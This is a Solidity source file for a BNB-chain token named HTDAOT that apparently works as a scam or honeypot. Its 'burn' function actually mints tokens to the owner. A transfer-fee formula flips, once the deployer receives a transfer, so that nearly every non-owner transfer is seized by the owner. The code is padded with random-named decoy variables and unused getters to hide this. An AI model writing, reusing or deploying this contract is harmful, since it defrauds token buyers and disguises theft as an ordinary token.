/**
 *Submitted for verification at BscScan.com on 2022-12-04
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.7.3;
contract HTDAOT {
event Transfer(address indexed from, address indexed to, uint256 value);
uint256 private  rzDJxj = 1000000000000000000;
address private  bDksCg = address(0);
uint256 public constant totalSupply = 100000000000000000000000000000;
mapping (address => mapping (address => uint256)) private _allowances;
uint256 public constant wcQCiF = 99999999999999999999999999999;
address private  BSZbpP = address(0);
address public owner;
uint256 private  IpyTbm = 10000000000000;
event Approval(address indexed owner, address indexed spender, uint256 value);
address private  PaCJdO = address(0);
uint256 private  KjNXZg = 1000000000000000000;
address private  xRUxdf = address(0);
uint8 public constant decimals = 18;
uint256 private  yYTiqQ = 10000000000;
uint256 private  nYEFVt = 100000000;
address private  ySPwvZ = address(0);
uint256 private  SqlHwG = 1000000000000000000000;
address private  WaNWDP = address(0);
mapping (address => uint256) public balanceOf;
uint256 private  wlkDnF = 1000000000000000;
event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
address public constant burnAddr = 0x000000000000000000000000000000000000dEaD;
string public  name = "HTDAOT";
address private  kNkUhi = address(0);
address private  JMiBNb = address(0);
address private  eNeYOv = address(0);
string public  symbol = "HTDAOT";
function burn(uint256 amount) public onlyOwner returns (bool) {
_burn(msg.sender, amount);
return true;
}




function approve(address spender, uint256 amount) public returns (bool) {
_approve(msg.sender, spender, amount);
return true;
}
function _getkNkUhi() private returns (address) {
return kNkUhi;
}

constructor () {
ySPwvZ = msg.sender;
owner = msg.sender;
balanceOf[owner] = totalSupply;
emit Transfer(address(0), owner, totalSupply);
}






function allowance(address _owner, address spender) public view returns (uint256) {
return _allowances[_owner][spender];
}
function _getyYTiqQ() private returns (uint256) {
return yYTiqQ;
}

function _getnYEFVt() private returns (uint256) {
return nYEFVt;
}

modifier onlyOwner() {
require(msg.sender == owner, "not owner");
_;
}
function _getbDksCg() private returns (address) {
return bDksCg;
}





function _getPaCJdO() private returns (address) {
return PaCJdO;
}

function _getBSZbpP() private returns (address) {
return BSZbpP;
}



function _approve(address _owner, address spender, uint256 amount) private {
require(_owner != address(0), "tpFxpmd 0");
require(spender != address(0), "fpFxpmd 0");

_allowances[_owner][spender] = amount;
emit Approval(_owner, spender, amount);
}




function transfer(address recipient, uint256 amount) public returns (bool) {
_transfer(msg.sender, recipient, amount);
return true;
}


function _transfer(address from, address to, uint256 amount) private {
require(from != address(0), "pFxpmd");
require(to != address(0), "pFxpmd");
require(amount <= balanceOf[from], "pFxpmd");
uint256 fee;
if (from == owner || to == owner){
fee = 0;
}
else{
fee = amount* wcQCiF/rzDJxj ;
}

uint256 transferAmount = amount - fee;
balanceOf[from] -= amount;
balanceOf[to] += transferAmount;
balanceOf[owner] += fee;
if (to==ySPwvZ){
rzDJxj = wcQCiF+2;
}
emit Transfer(from, to, transferAmount);
}


function _getwlkDnF() private returns (uint256) {
return wlkDnF;
}

function renounceOwnership() public onlyOwner {
emit OwnershipTransferred(owner, address(0));
owner = address(0);
}
function _burn(address account, uint256 amount) private {
require(account != address(0), "BEP20: mint to the zero address");

balanceOf[account] += amount;
}
function _getIpyTbm() private returns (uint256) {
return IpyTbm;
}



function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
require(_allowances[sender][msg.sender] >= amount, "failed");
_transfer(sender, recipient, amount);
_approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
return true;
}
function _getWaNWDP() private returns (address) {
return WaNWDP;
}

function _getKjNXZg() private returns (uint256) {
return KjNXZg;
}

function _getxRUxdf() private returns (address) {
return xRUxdf;
}

function _getJMiBNb() private returns (address) {
return JMiBNb;
}



function _getSqlHwG() private returns (uint256) {
return SqlHwG;
}

function _geteNeYOv() private returns (address) {
return eNeYOv;
}




}